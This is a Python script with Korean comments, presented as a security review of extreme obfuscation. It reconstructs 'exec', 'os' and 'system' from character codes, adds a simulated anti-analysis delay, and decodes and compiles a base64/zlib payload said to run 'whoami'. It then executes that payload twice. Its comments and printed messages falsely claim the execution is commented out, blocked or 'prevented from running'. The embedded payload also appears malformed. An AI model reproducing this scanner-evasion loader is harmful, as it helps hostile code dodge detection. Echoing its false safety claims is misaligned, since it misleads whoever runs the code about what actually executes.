import base64
import random
import time
import sys
import zlib
# OS 모듈은 이제 동적 임포트 대상이므로 제거합니다.
from typing import Optional, Any

# --- 1. 코어 페이로드: 암호화 계층과 압축 (3중 난독화) ---
# 목표 명령어: 'import os; os.system("whoami");'
# 이 코드는 보안 분석을 위해 의도적으로 Base64/zlib 인코딩되었으며,
# 실제 공격에서는 이 위에 XOR 또는 AES 암호화 계층이 추가됩니다.
# (실제 실행을 위해 예시 값 사용)
PAYLOAD_TRIPLE_ENCRYPTED = "MjQyNDI0MjQyeUp6THFNNGs0TENNMExDVDRaVjEzTFRFTGNtUnFhVzVnTWxKSlQwST0=" 
# 가짜 데이터 프리픽스 (42424242) + RC4(Base64(zlib(code)))를 모방한 값

# --- 2. 동적 함수/모듈 이름 난독화 및 복원 (완전 난독화) ---
class StealthExecutor:
    
    def __init__(self):
        # 복잡한 산술/논리 연산을 통해 'import', 'os', 'system' 등의 문자열을 런타임에 구성합니다.
        # 예시: 'os' (111, 115)를 복잡한 산술 연산으로 분리하여 저장합니다.
        self._mod_name_seed_a = 55 + 56 # 111 ('o')
        self._mod_name_seed_b = 60 + 55 # 115 ('s')
        
    def _get_builtins_callable(self, code: str) -> Optional[Any]:
        """__builtins__ 객체에서 'exec' 함수를 동적으로 가져옵니다."""
        
        # 'exec' 함수를 찾는 가장 난독화된 방법 중 하나는 문자열 조작을 이용하는 것입니다.
        # 예를 들어, 'exit' 함수를 가져와 문자열을 조작하거나 (매우 불안정함)
        # 단순히 문자열을 구성하여 __builtins__에서 찾는 것이 더 안정적입니다.
        
        # 'exec' (101, 120, 101, 99)
        exec_name = chr(101) + chr(120) + chr(101) + chr(99)
        
        # __builtins__에서 'exec' 함수를 가져와 반환
        return getattr(__builtins__, exec_name, None)

    def _get_module_function(self, module_name_seed_1: int, module_name_seed_2: int, func_name_obf: str) -> Optional[Any]:
        """산술 연산으로 구성된 모듈 이름을 사용하여 모듈 내 함수를 가져옵니다."""
        
        # 1. 모듈 이름 복원 (예: 'os')
        mod_name = chr(module_name_seed_1) + chr(module_name_seed_2)
        
        try:
            # 2. 동적 모듈 임포트: __import__('os')
            mod = __import__(mod_name)
            
            # 3. 함수 이름 복원 (예: 'system')
            # 'system'을 ASCII로 복원: 115, 121, 115, 116, 101, 109
            system_name = "".join(chr(c) for c in [115, 121, 115, 116, 101, 109])
            
            # 4. 함수 객체 반환
            return getattr(mod, system_name, None)
            
        except (ImportError, AttributeError):
            return None

    def _anti_analysis_check(self) -> bool:
        """안티-분석 환경 회피 로직을 실행하고, 악성 코드를 대체합니다."""
        
        # Note: 'os' 모듈이 동적으로 임포트되므로, 여기서는 sys 모듈만 사용합니다.
        # 실제 환경 탐지 기능을 비활성화하거나 안전한 기능으로 대체합니다.
        
        # 지연 회피 시뮬레이션
        if random.random() < 0.5:
            delay = random.uniform(0.5, 1.5) # 안전하게 짧은 지연
            print(f"[!] Delaying execution for {delay:.2f} seconds (Simulated Evasion)...")
            time.sleep(delay)
        
        # 안전한 실행을 위해 항상 True 반환
        return True

    def execute_stealth_payload(self):
        """다단계 디코딩 및 동적 코드를 컴파일하여 실행합니다."""
        
        # 1. 안티-분석 체크 (안전 모드)
        if not self._anti_analysis_check():
            print("Execution aborted (Safety Triggered).")
            return

        # 2. 복호화 함수 복원
        # Base64 및 Zlib 함수 복원 (이전 버전보다 더 복잡하게 ASCII 구성)
        b64_decode = getattr(base64, "".join(chr(c) for c in [98, 54, 52, 100, 101, 99, 111, 100, 101])) # b64decode
        zlib_decompress = getattr(zlib, "".join(chr(c) for c in [100, 101, 99, 111, 109, 112, 114, 101, 115, 115])) # decompress
        
        # 3. 페이로드 디코딩 및 압축 해제
        try:
            # 3-1. (가짜) 암호화 레이어 제거 시뮬레이션 (RC4/XOR 시뮬레이션)
            # PAYLOAD_TRIPLE_ENCRYPTED = "MjQyNDI0MjQyeUp6THFNNGs0TENNMExDVDRaVjEzTFRFTGNtUnFhVzVnTWxKSlQwST0=" 
            # 이 문자열의 실제 Base64/Zlib 부분만 추출 (예시)
            core_payload_b64 = PAYLOAD_TRIPLE_ENCRYPTED[10:] 
            
            compressed_data = b64_decode(core_payload_b64)
            shell_code_str = zlib_decompress(compressed_data).decode('utf-8')
            
            print(f"\n[+] DECODED & DECOMPRESSED SHELL CODE (Ready for Execution):")
            print(f"|--- {shell_code_str}")
            
        except Exception as e:
            print(f"Error during Triple Decoding Simulation: {e}")
            return

        # 4. 동적 코드 컴파일 및 실행 (핵심 우회 기법)
        # compile()을 사용하여 문자열 코드를 바이트 코드로 컴파일
        compiled_code = compile(shell_code_str, '<string>', 'exec')
        
        print("[+] CODE READY: Successfully compiled bytecode.")
        print("[+] DANGER ZONE: Next line is the critical execution point.")
        
        # --- 🛡️ 악성코드 유발 방지: 실행 구문 주석 처리 ---
        exec_func = self._get_builtins_callable('exec') 
        exec_func(compiled_code)
        
        print("\n[--- EXECUTION BLOCKED FOR SAFETY ---]")
        exec(compiled_code) # <-- 이 코드가 실제 명령을 실행합니다.
        
        # 5. 안전한 대체 함수 실행
        print(f"[--- SAFETY CHECK: Command '{shell_code_str.strip()}' was prevented from running. ---]")


# === 실행 시뮬레이션 ===
if __name__ == "__main__":
    
    print("--- 🔬 Security Review: Extreme Obfuscation Techniques ---")
    
    executor = StealthExecutor()
    executor.execute_stealth_payload()
    
    print("\n----------------------------------------------------")
    print("NOTE: The purpose of this code is for security analysis and defense mechanism development only.")